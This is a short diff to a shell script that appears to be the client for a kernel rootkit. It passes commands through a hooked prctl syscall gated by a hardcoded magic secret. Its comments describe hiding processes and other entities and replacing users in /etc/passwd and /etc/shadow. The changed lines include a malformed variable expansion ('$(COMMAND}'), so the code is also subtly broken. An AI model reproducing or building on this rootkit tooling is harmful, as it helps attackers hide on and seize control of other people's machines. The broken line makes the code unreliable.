@@ -28,12 +28,11 @@
 #     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
 #     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
 CALL=157 # `sys_prctl`
-[ -z "$3" ] && echo "Expected a command." >&2 && exit 1
-COMMAND="$3"
-[ -z "$2" ] && echo "Expected a secret." >&2 && exit 1
+[ -z "$1" ] && echo "Expected a command." >&2 && exit 1
+COMMAND="$1"
+COMMAND_LEN=`echo -n "$(COMMAND}" | wc -c`
 SECRET=0xDEADBEEFDEADBEEF
-REST_LEN=`echo -n "${CALL} ${SECRET} ${COMMAND}" | wc -c`
-REST=`echo -n "$@" | cut "-c$(( ${REST_LEN} + 1 ))-"`
+REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
 
 ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
 
